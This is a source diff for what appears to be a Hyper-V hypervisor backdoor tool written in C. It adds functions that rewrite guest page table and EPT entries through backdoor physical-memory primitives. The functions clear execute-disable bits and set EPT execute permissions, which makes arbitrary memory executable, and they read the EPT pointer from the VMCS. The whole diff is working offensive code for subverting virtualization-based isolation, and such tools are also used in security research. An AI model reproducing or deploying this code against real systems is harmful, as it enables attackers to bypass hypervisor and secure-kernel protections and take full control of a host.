@@ -6,10 +6,20 @@
 // amount of time to colect EPT information
 #define EPT_INFO_TIMEOUT 5
 
+// Hyper-V PTE list virtual address
 #define HV_PTE_BASE 0xffffff0000000000
+
+// PTE index to map in backdoor_phys_read() and backdoor_phys_write()
+#define PHYS_MAP_PTE 0
 
 // secure kernel maximum image size
 #define SK_MAX_IMAGE_SIZE (10 * 1024 * 1024) // 10M
+
+// remove XD bit from PML4/PDPT/PD/PT entry
+#define EXECUTABLE_PT(_e_) ((_e_) & ~((uint64_t)1 << 63))
+
+// set Execute Access bit on EPT PML4/PDPT/PD/PT entry
+#define EXECUTABLE_PTE(_e_) ((_e_) | ((uint64_t)1 << 2))
 
 bool m_quiet = false;
 //--------------------------------------------------------------------------------------
@@ -336,10 +346,16 @@ int backdoor_virt_write_8(uint64_t addr, uint8_t val)
     return -1;
 }
 //--------------------------------------------------------------------------------------
-int backdoor_virt_map(uint64_t pte_index, uint64_t phys_addr)
+int backdoor_virt_map(uint64_t pte_index, uint64_t phys_addr, uint64_t *entry)
 {
     uint64_t pte_addr = HV_PTE_BASE + (pte_index * sizeof(uint64_t));
     uint64_t pte_data = (phys_addr & 0xfffffffff000) | PTE_PRESENT | PTE_RW;
+
+    // read page table entry
+    if (backdoor_virt_read_64(pte_addr, entry) != 0)
+    {
+        return -1;
+    }
 
     // write page table entry
     if (backdoor_virt_write_64(pte_addr, pte_data) != 0)
@@ -354,12 +370,12 @@ int backdoor_virt_map(uint64_t pte_index, uint64_t phys_addr)
     return 0;
 }
 //--------------------------------------------------------------------------------------
-int backdoor_virt_unmap(uint64_t pte_index)
+int backdoor_virt_unmap(uint64_t pte_index, uint64_t entry)
 {
     uint64_t pte_addr = HV_PTE_BASE + (pte_index * sizeof(uint64_t));
 
     // write page table entry
-    if (backdoor_virt_write_64(pte_addr, 0) != 0)
+    if (backdoor_virt_write_64(pte_addr, entry) != 0)
     {
         return -1;
     }
@@ -375,6 +391,7 @@ int backdoor_phys_read(uint64_t addr, void *buff, int size)
 {
     uint64_t temp_addr = _ALIGN_DOWN(addr, PAGE_SIZE);
     uint64_t temp_size = _ALIGN_UP(addr - temp_addr + size, PAGE_SIZE);
+    uint64_t entry = 0;
 
     // allocate temporary qword aligned buffer
     uint8_t *temp = (uint8_t *)bd_alloc(temp_size);
@@ -386,17 +403,17 @@ int backdoor_phys_read(uint64_t addr, void *buff, int size)
     for (int i = 0; i < temp_size; i += PAGE_SIZE)
     {
         // map physical memory page at zero VA
-        backdoor_virt_map(0, temp_addr + i);        
+        backdoor_virt_map(PHYS_MAP_PTE, temp_addr + i, &entry);
 
         // read page contents from virtual memory
-        if (backdoor_virt_read(0, temp + i, PAGE_SIZE) != 0)
+        if (backdoor_virt_read(PHYS_MAP_PTE * PAGE_SIZE, temp + i, PAGE_SIZE) != 0)
         {
             bd_free(temp);
             return -1;            
         }
         
         // unmap physical memory page
-        backdoor_virt_unmap(0);   
+        backdoor_virt_unmap(PHYS_MAP_PTE, entry);
     }
 
     // copy readed data to calee buffer
@@ -430,6 +447,7 @@ int backdoor_phys_write(uint64_t addr, void *buff, int size)
 {
     uint64_t temp_addr = _ALIGN_DOWN(addr, PAGE_SIZE);
     uint64_t temp_size = _ALIGN_UP(addr - temp_addr + size, PAGE_SIZE);
+    uint64_t entry = 0;
 
     // allocate temporary qword aligned buffer
     uint8_t *temp = (uint8_t *)bd_alloc(temp_size);
@@ -441,17 +459,17 @@ int backdoor_phys_write(uint64_t addr, void *buff, int size)
     for (int i = 0; i < temp_size; i += PAGE_SIZE)
     {
         // map physical memory page at zero VA
-        backdoor_virt_map(0, temp_addr + i);        
+        backdoor_virt_map(PHYS_MAP_PTE, temp_addr + i, &entry);
 
         // read page contents from virtual memory
-        if (backdoor_virt_read(0, temp + i, PAGE_SIZE) != 0)
+        if (backdoor_virt_read(PHYS_MAP_PTE * PAGE_SIZE, temp + i, PAGE_SIZE) != 0)
         {
             bd_free(temp);
             return -1;            
         }
         
         // unmap physical memory page
-        backdoor_virt_unmap(0);   
+        backdoor_virt_unmap(PHYS_MAP_PTE, entry);
     }
 
     // copy new data to the buffer
@@ -460,17 +478,17 @@ int backdoor_phys_write(uint64_t addr, void *buff, int size)
     for (int i = 0; i < temp_size; i += PAGE_SIZE)
     {
         // map physical memory page at zero VA
-        backdoor_virt_map(0, temp_addr + i);        
+        backdoor_virt_map(PHYS_MAP_PTE, temp_addr + i, &entry);
 
         // write page contents into virtual memory
-        if (backdoor_virt_write(0, temp + i, PAGE_SIZE) != 0)
+        if (backdoor_virt_write(PHYS_MAP_PTE * PAGE_SIZE, temp + i, PAGE_SIZE) != 0)
         {
             bd_free(temp);
             return -1;            
         }
         
         // unmap physical memory page
-        backdoor_virt_unmap(0);   
+        backdoor_virt_unmap(PHYS_MAP_PTE, entry);
     }
 
     bd_free(temp);
@@ -1023,7 +1041,7 @@ int backdoor_phys_update(uint64_t addr, uint64_t entry, uint64_t *old, uint64_t 
             if (!m_quiet)
             {
                 bd_printf(
-                    "  PTE 0x%llx[0x%llx]: 0x%llx -> 0x%llx\n", 
+                    "  EPT PTE 0x%llx[0x%llx]: 0x%llx -> 0x%llx\n", 
                     PFN_TO_PAGE(PD_entry.Bits.PageTableBaseAddress), PTE_INDEX(addr), 
                     *old, entry
                 );
@@ -1652,6 +1670,459 @@ _end:
     m_quiet = false;
 
     return ret;
+}
+//--------------------------------------------------------------------------------------
+int backdoor_make_exec_ept(uint64_t addr, uint64_t pml4_addr)
+{
+    uint64_t phys_addr = 0;
+
+    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PML4_entry;    
+
+    phys_addr = PML4_ADDRESS(pml4_addr) + PML4_INDEX(addr) * sizeof(uint64_t);
+
+    if (backdoor_phys_read_64(phys_addr, &PML4_entry.Uint64) != 0)
+    {
+        return -1;
+    }
+
+    if (!EPT_PRESENT(PML4_entry.Uint64))
+    {
+        bd_printf("ERROR: EPT PML4E for 0x%llx is not present\n", addr);
+        return -1;
+    }
+
+    // make EPT PML4 entry executable
+    if (backdoor_phys_write_64(phys_addr, EXECUTABLE_PTE(PML4_entry.Uint64)) != 0)
+    {
+        return -1;
+    }
+
+    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PDPT_entry;
+
+    phys_addr = PFN_TO_PAGE(PML4_entry.Bits.PageTableBaseAddress) + PDPT_INDEX(addr) * sizeof(uint64_t);
+
+    if (backdoor_phys_read_64(phys_addr, &PDPT_entry.Uint64) != 0)
+    {
+        return -1;
+    }
+
+    if (!EPT_PRESENT(PDPT_entry.Uint64))
+    {
+        bd_printf("ERROR: EPT PDPTE for 0x%llx is not present\n", addr);
+        return -1;
+    }
+
+    // make EPT PDPT entry executable
+    if (backdoor_phys_write_64(phys_addr, EXECUTABLE_PTE(PDPT_entry.Uint64)) != 0)
+    {
+        return -1;
+    }
+
+    // check for page size flag
+    if ((PDPT_entry.Uint64 & PDPTE_PDE_PS) == 0)
+    {
+        X64_PAGE_DIRECTORY_ENTRY_4K PD_entry;
+
+        phys_addr = PFN_TO_PAGE(PDPT_entry.Bits.PageTableBaseAddress) + PDE_INDEX(addr) * sizeof(uint64_t);
+
+        if (backdoor_phys_read_64(phys_addr, &PD_entry.Uint64) != 0)
+        {
+            return -1;
+        }
+
+        if (!EPT_PRESENT(PD_entry.Uint64))
+        {
+            bd_printf("ERROR: EPT PDE for 0x%llx is not present\n", addr);
+            return -1;
+        }
+
+        // make EPT PD entry executable
+        if (backdoor_phys_write_64(phys_addr, EXECUTABLE_PTE(PD_entry.Uint64)) != 0)
+        {
+            return -1;
+        }
+
+        // check for page size flag
+        if ((PD_entry.Uint64 & PDPTE_PDE_PS) == 0)
+        {
+            X64_PAGE_TABLE_ENTRY_4K PT_entry;
+
+            phys_addr = PFN_TO_PAGE(PD_entry.Bits.PageTableBaseAddress) + PTE_INDEX(addr) * sizeof(uint64_t);
+
+            if (backdoor_phys_read_64(phys_addr, &PT_entry.Uint64) != 0)
+            {
+                return -1;
+            }
+
+            if (EPT_PRESENT(PT_entry.Uint64))
+            {
+                // make EPT PT entry executable
+                if (backdoor_phys_write_64(phys_addr, EXECUTABLE_PTE(PT_entry.Uint64)) != 0)
+                {
+                    return -1;
+                }
+
+                return 0;
+            }
+            else
+            {
+                bd_printf("ERROR: EPT PTE for 0x%llx is not present\n", addr);
+            }
+        }
+        else
+        {
+            // 2M page
+            return 0;
+        }                  
+    }
+    else
+    {
+        // 1G page
+        return 0;
+    }
+
+    return -1;
+}
+//--------------------------------------------------------------------------------------
+int backdoor_make_exec_pt(uint64_t addr, uint64_t pml4_addr, uint64_t ept_addr)
+{
+    uint64_t phys_addr = 0;
+    
+    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PML4_entry;    
+
+    phys_addr = PML4_ADDRESS(pml4_addr) + PML4_INDEX(addr) * sizeof(uint64_t);
+
+    if (ept_addr != 0)
+    {
+        if (backdoor_phys_translate(phys_addr, &phys_addr, ept_addr) != 0)
+        {
+            return -1;
+        }
+    }
+
+    if (backdoor_phys_read_64(phys_addr, &PML4_entry.Uint64) != 0)
+    {
+        return -1;
+    }
+
+    if (PML4_entry.Bits.Present == 0)
+    {
+        bd_printf("ERROR: PML4E for 0x%llx is not present\n", addr);
+        return -1;
+    }
+
+    // make PML4 entry executable
+    if (backdoor_phys_write_64(phys_addr, EXECUTABLE_PT(PML4_entry.Uint64)) != 0)
+    {
+        return -1;
+    }
+
+    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PDPT_entry;
+
+    phys_addr = PFN_TO_PAGE(PML4_entry.Bits.PageTableBaseAddress) + PDPT_INDEX(addr) * sizeof(uint64_t);
+
+    if (ept_addr != 0)
+    {
+        if (backdoor_phys_translate(phys_addr, &phys_addr, ept_addr) != 0)
+        {
+            return -1;
+        }
+    }
+
+    if (backdoor_phys_read_64(phys_addr, &PDPT_entry.Uint64) != 0)
+    {
+        return -1;
+    }
+
+    if (PDPT_entry.Bits.Present == 0)
+    {
+        bd_printf("ERROR: PDPTE for 0x%llx is not present\n", addr);
+        return -1;
+    }
+
+    // make PDPT entry executable
+    if (backdoor_phys_write_64(phys_addr, EXECUTABLE_PT(PDPT_entry.Uint64)) != 0)
+    {
+        return -1;
+    }
+
+    // check for page size flag
+    if ((PDPT_entry.Uint64 & PDPTE_PDE_PS) == 0)
+    {
+        X64_PAGE_DIRECTORY_ENTRY_4K PD_entry;
+
+        phys_addr = PFN_TO_PAGE(PDPT_entry.Bits.PageTableBaseAddress) + PDE_INDEX(addr) * sizeof(uint64_t);
+
+        if (ept_addr != 0)
+        {
+            if (backdoor_phys_translate(phys_addr, &phys_addr, ept_addr) != 0)
+            {
+                return -1;
+            }
+        }
+
+        if (backdoor_phys_read_64(phys_addr, &PD_entry.Uint64) != 0)
+        {
+            return -1;
+        }
+
+        if (PD_entry.Bits.Present == 0)
+        {
+            bd_printf("ERROR: PDE for 0x%llx is not present\n", addr);
+            return -1;
+        }
+
+        // make PD entry executable
+        if (backdoor_phys_write_64(phys_addr, EXECUTABLE_PT(PD_entry.Uint64)) != 0)
+        {
+            return -1;
+        }
+
+        // check for page size flag
+        if ((PD_entry.Uint64 & PDPTE_PDE_PS) == 0)
+        {
+            X64_PAGE_TABLE_ENTRY_4K PT_entry;
+
+            phys_addr = PFN_TO_PAGE(PD_entry.Bits.PageTableBaseAddress) + PTE_INDEX(addr) * sizeof(uint64_t);
+
+            if (ept_addr != 0)
+            {
+                if (backdoor_phys_translate(phys_addr, &phys_addr, ept_addr) != 0)
+                {
+                    return -1;
+                }
+            }
+
+            if (backdoor_phys_read_64(phys_addr, &PT_entry.Uint64) != 0)
+            {
+                return -1;
+            }
+
+            if (PT_entry.Bits.Present)
+            {
+                // make PT entry executable
+                if (backdoor_phys_write_64(phys_addr, EXECUTABLE_PT(PT_entry.Uint64)) != 0)
+                {
+                    return -1;
+                }
+
+                // 4K page
+                phys_addr = PFN_TO_PAGE(PT_entry.Bits.PageTableBaseAddress) +
+                            PAGE_OFFSET_4K(addr);
+
+                if (ept_addr != 0)
+                {
+                    // make EPT entries executable too
+                    if (backdoor_make_exec_ept(phys_addr, ept_addr) != 0)
+                    {
+                        return -1;
+                    }
+                }
+
+                return 0;
+            }
+            else
+            {
+                bd_printf("ERROR: PTE for 0x%llx is not present\n", addr);
+            }
+        }
+        else
+        {
+            // 2M page
+            phys_addr = PFN_TO_PAGE(PD_entry.Bits.PageTableBaseAddress) +
+                        PAGE_OFFSET_2M(addr);
+
+            if (ept_addr != 0)
+            {
+                for (uint64_t i = 0; i < 0x200; i += 1)
+                {
+                    // make EPT entries executable too
+                    if (backdoor_make_exec_ept(phys_addr + (i * PAGE_SIZE), ept_addr) != 0)
+                    {
+                        return -1;
+                    }
+                }
+            }
+
+            return 0;
+        }                  
+    }
+    else
+    {
+        // 1G page
+        phys_addr = PFN_TO_PAGE(PDPT_entry.Bits.PageTableBaseAddress) +
+                    PAGE_OFFSET_1G(addr);
+        
+        if (ept_addr != 0)
+        {
+            for (uint64_t i = 0; i < 0x40000; i += 1)
+            {
+                // make EPT entries executable too
+                if (backdoor_make_exec_ept(phys_addr + (i * PAGE_SIZE), ept_addr) != 0)
+                {
+                    return -1;
+                }
+            }
+        }
+
+        return 0;
+    }
+
+    return -1;
+}
+//--------------------------------------------------------------------------------------
+int backdoor_pte_addr(uint64_t addr, uint64_t *pte_addr, HVBD_PTE_SIZE *pte_size, uint64_t pml4_addr, uint64_t ept_addr)
+{
+    uint64_t phys_addr = 0;
+    
+    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PML4_entry;    
+
+    phys_addr = PML4_ADDRESS(pml4_addr) + PML4_INDEX(addr) * sizeof(uint64_t);
+
+    if (ept_addr != 0)
+    {
+        if (backdoor_phys_translate(phys_addr, &phys_addr, ept_addr) != 0)
+        {
+            return -1;
+        }
+    }
+
+    if (backdoor_phys_read_64(phys_addr, &PML4_entry.Uint64) != 0)
+    {
+        return -1;
+    }
+
+    if (PML4_entry.Bits.Present == 0)
+    {
+        bd_printf("ERROR: PML4E for 0x%llx is not present\n", addr);
+        return -1;
+    }    
+
+    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PDPT_entry;
+
+    phys_addr = PFN_TO_PAGE(PML4_entry.Bits.PageTableBaseAddress) + PDPT_INDEX(addr) * sizeof(uint64_t);
+
+    if (ept_addr != 0)
+    {
+        if (backdoor_phys_translate(phys_addr, &phys_addr, ept_addr) != 0)
+        {
+            return -1;
+        }
+    }
+
+    if (backdoor_phys_read_64(phys_addr, &PDPT_entry.Uint64) != 0)
+    {
+        return -1;
+    }
+
+    if (PDPT_entry.Bits.Present == 0)
+    {
+        bd_printf("ERROR: PDPTE for 0x%llx is not present\n", addr);
+        return -1;
+    }    
+
+    // check for page size flag
+    if ((PDPT_entry.Uint64 & PDPTE_PDE_PS) == 0)
+    {
+        X64_PAGE_DIRECTORY_ENTRY_4K PD_entry;
+
+        phys_addr = PFN_TO_PAGE(PDPT_entry.Bits.PageTableBaseAddress) + PDE_INDEX(addr) * sizeof(uint64_t);
+
+        if (ept_addr != 0)
+        {
+            if (backdoor_phys_translate(phys_addr, &phys_addr, ept_addr) != 0)
+            {
+                return -1;
+            }
+        }
+
+        if (backdoor_phys_read_64(phys_addr, &PD_entry.Uint64) != 0)
+        {
+            return -1;
+        }
+
+        if (PD_entry.Bits.Present == 0)
+        {
+            bd_printf("ERROR: PDE for 0x%llx is not present\n", addr);
+            return -1;
+        }        
+
+        // check for page size flag
+        if ((PD_entry.Uint64 & PDPTE_PDE_PS) == 0)
+        {
+            X64_PAGE_TABLE_ENTRY_4K PT_entry;
+
+            phys_addr = PFN_TO_PAGE(PD_entry.Bits.PageTableBaseAddress) + PTE_INDEX(addr) * sizeof(uint64_t);
+
+            if (ept_addr != 0)
+            {
+                if (backdoor_phys_translate(phys_addr, &phys_addr, ept_addr) != 0)
+                {
+                    return -1;
+                }
+            }
+
+            if (backdoor_phys_read_64(phys_addr, &PT_entry.Uint64) != 0)
+            {
+                return -1;
+            }
+
+            if (PT_entry.Bits.Present)
+            {                
+                // 4K page
+                *pte_addr = phys_addr;
+                *pte_size = HVBD_PTE_SIZE_4K;
+
+                return 0;
+            }
+            else
+            {
+                bd_printf("ERROR: PTE for 0x%llx is not present\n", addr);
+            }
+        }
+        else
+        {
+            // 2M page
+            *pte_addr = phys_addr;
+            *pte_size = HVBD_PTE_SIZE_2M;
+
+            return 0;
+        }                  
+    }
+    else
+    {
+        // 1G page
+        *pte_addr = phys_addr;
+        *pte_size = HVBD_PTE_SIZE_1G;
+
+        return 0;
+    }
+
+    return -1;
+}
+//--------------------------------------------------------------------------------------
+int backdoor_ept_addr(uint64_t *addr)
+{
+    uint64_t addr_high = 0, addr_low = 0;
+
+    // read high dword of EPT address from current VMCS
+    if (backdoor_vmread(EPT_POINTER_HIGH, &addr_high) != 0)
+    {
+        return -1;
+    }
+
+    // read low dword of EPT address from current VMCS
+    if (backdoor_vmread(EPT_POINTER, &addr_low) != 0)
+    {
+        return -1;
+    }
+
+    if (addr)
+    {
+        *addr = (addr_high << 32) | addr_low;
+    }
+
+    return 0;
 }
 //--------------------------------------------------------------------------------------
 // EoF
